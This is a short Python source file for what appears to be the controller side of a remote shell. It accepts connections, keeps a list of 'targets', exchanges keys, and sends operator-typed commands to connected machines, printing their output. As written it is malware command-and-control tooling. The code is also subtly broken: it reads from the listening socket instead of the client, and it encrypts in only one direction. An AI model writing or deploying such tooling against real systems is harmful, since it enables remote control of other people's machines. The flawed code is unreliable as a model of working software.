import socket
import time
import threading
from _crypto import _crypto as Crypto

clients = []
connections = []

class Server:
    def __init__(self, HOST, PORT, crypt):
        try:
            self.crypt = crypt
            self.HOST = HOST
            self.serv = socket.socket()
            self.serv.bind((self.HOST, PORT))
            print(f"Created socket {self.HOST}:{PORT}")
            self.serv.listen(5)
            
        except socket.error as msg:
            print(f"Socket creation error: {msg}")
    
    def socket_accept(self):
        client, address = self.serv.accept()
        clients.append(f"{address[0]}:{address[1]}")
        connections.append(client)
        self.crypt.sendEndpointPubKey(client)
        self.crypt.getEndpointPubKey(client)
        self.send_commands(client)
        client.close()


    
    def send_commands(self, client):
        while True:
            dir = self.crypt.Decrypt(self.serv.recv(1024))
            cmd = input(dir+"$ ")
            if cmd == 'exit':
                client.close()
                self.closeSocket()
                return

            if cmd == 'socket exit':
                return

            if cmd == 'target -ls':
                for x in range(0,len(clients)):
                    print(f"{x}:{clients[x]}")
                    x+=1
            
            if len(str.encode(cmd)) > 0:
                client.send(str.encode(cmd))
                client_response = str(client.recv(2048), "utf-8")
                print(client_response, end="")

    def closeSocket(self):
        self.serv.close()
        return

    